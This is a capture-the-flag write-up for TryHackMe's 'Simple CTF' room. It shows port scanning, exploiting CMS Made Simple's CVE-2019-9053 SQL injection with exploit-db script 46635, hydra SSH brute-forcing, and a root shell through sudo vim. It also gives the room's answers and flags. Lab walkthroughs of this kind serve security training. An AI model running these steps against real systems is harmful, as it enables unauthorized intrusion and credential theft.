# :game_die: Simple CTF (Write-up). Introduction

---

## Introduction

It is a relatively easy [room](https://tryhackme.com/room/easyctf) to get you started in CTFs, feel free to ask me about anything at [Twitter](https://twitter.com/Nouureldin_Ehab) and [Linkedin](https://www.linkedin.com/in/noureldin-ehab-a57940190/)

## Recon

The first thing we need to do in any CTF is to scan the open ports using [Nmap](https://nmap.org/) (If you don't know what is Nmap i recommend checking [this room](https://tryhackme.com/room/furthernmap))

```
sudo nmap -sS -sV {Add your machine ip here}
```

-sS flag is for TCP SYN scan

-sV flag is for version scan

visit the [documentation](https://nmap.org/docs.html) for more information about the flags and how to use them

*(Here we see ports 21(FTP), 88(HTTP), 2222(ssh) are open)*How many services are running under port 1000?

- `2`

- What is running on the higher port?

- `ssh`

Now that we know the open port I decided to check them lets start with FTP

FTP(21):
I tried to connect to the machine using FTP

```
ftp {Add your machine ip here}
```

But it turns out to be a rabbit hole.

HTTP(88):
Its a web server so i try to connect to it by writing the machine ip address in the browser

I decided to brute force the directory with a tool called [dir buster](https://tools.kali.org/web-applications/dirbuster) (its a pre-downloaded tool in kali, this tool was made by OWASP)

```
dirb http://{Add your machine ip here}/
```

Awesome now we found few directories lets check them

Let's start with `/simple`

visit :

```
http://{Add your machine ip here}/simple/
```

*(if you dont know what is a CMS i really recommend reading this [blog](https://kinsta.com/knowledgebase/content-management-system/))*

As we see it is a content manager (CMS) called “CMS Made Simple”. Let’s see if there is any CVEs for this CMS

If we checked the website carefully we will be able to see the CMS version (2.2.8)

## Threat Modeling

By using a tool called searchsploit (it's a tool that search the famous website [exploit database](https://www.exploit-db.com/searchsploit) for CVEs)

```
searchsploit cms made simple 2.2.8
```

*(If you want to read more about SQL injection check this [blog](https://www.w3schools.com/sql/sql_injection.asp))*

As we see its vulnerable to SQL injection

We can find the CVE number by googling `cms made simple 2.2.8 exploit` ([The CVE link](https://www.exploit-db.com/exploits/46635))

- What’s the CVE you’re using against the application?

- `CVE-2019-9053`

As we saw earlier the “CMS made simple” is vulnerable to SQL Injection

- To what kind of vulnerability is the application vulnerable?

- `SQLi`

## Exploitation

Now we will use the exploit we found, lets use the python module that we found using searchsploit

```
searchsploit -m 46635
```

The python script needs an ip address and an optional wordlist if the -c flag is set.
(To avoid any problems while running the script use python2 and make sure you download (termcolor and requests) they are python modules that the script use you can download them using pip install)

## Get Noureldin Ehab | Creeper.exe’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Now lets run the script:

```
python 46635.py -u http://{Add your machine ip here}:80/simple --wordlist=/usr/share/wordlists/rockyou.txt -c[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

Now since we have a hash we can use [HashCat](https://hashcat.net/hashcat/) to crack it

As we see Hashcat wasn't able to crack it so I tried [John The Ripper](https://www.openwall.com/john/) but it failed too so I decided to try [hydra](https://github.com/vanhauser-thc/thc-hydra) to brute force ssh since now we have a username (mitch)

```
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://{Add your machine ip here}:2222 -t 4
```

- What’s the password?

- `secret`

- Where can you login with the details obtained?

- `ssh`

Now since we know both the username(mitch) and the password(secret) we can connect to the machine using ssh

```
ssh mitch@{Add your machine ip here} -p 2222
```

Now we are in yaaaaaaaaaaaay

When you write `whoami` you will see we are logged in as “mitch”

now we will write `ls` to see what files are in our current directory

We see that there is only one file called “user.txt”

So we use `cat user.txt` to run the file

- What’s the user flag?

- `G00d j0b, keep up!`

Now let's go to the root directory by using `cd ..` and then using `ls` to see if there are any users other than mitch

- Is there any other user in the home directory? What’s its name?

- `Sunbath`

## Post Exploitation (Privilege Escalation)

To have a more stable shell we need to run `/bin/bash`

Now we need to run `sudo -l` to see what are the commands that mitch is allowed to run as root

Here we notice that we can run `vim` with root access with some googling, i find this blog that explains how to run system commands using `vim` (-c flag)

- What can you leverage to spawn a privileged shell?

- `vim`

Now we will try running `sudo vim -c '!whoami'` to see if we are root

it worked yaaay now let's try to have root shell using `sudo /usr/bin/vim -c ':!/bin/sh'`

Now since we are root let's run `ls -la`

Now lets cat the root.txt file using `cat /root/root.txt` command

- What’s the root flag?

- `W3ll d0n3. You made it!`

## I love connecting with different people so if you want to say hi, I’ll be happy to meet you more! :)

[LinkedIn](https://www.linkedin.com/in/noureldin-ehab-a57940190/)[Twitter](https://twitter.com/Nouureldin_Ehab)

---
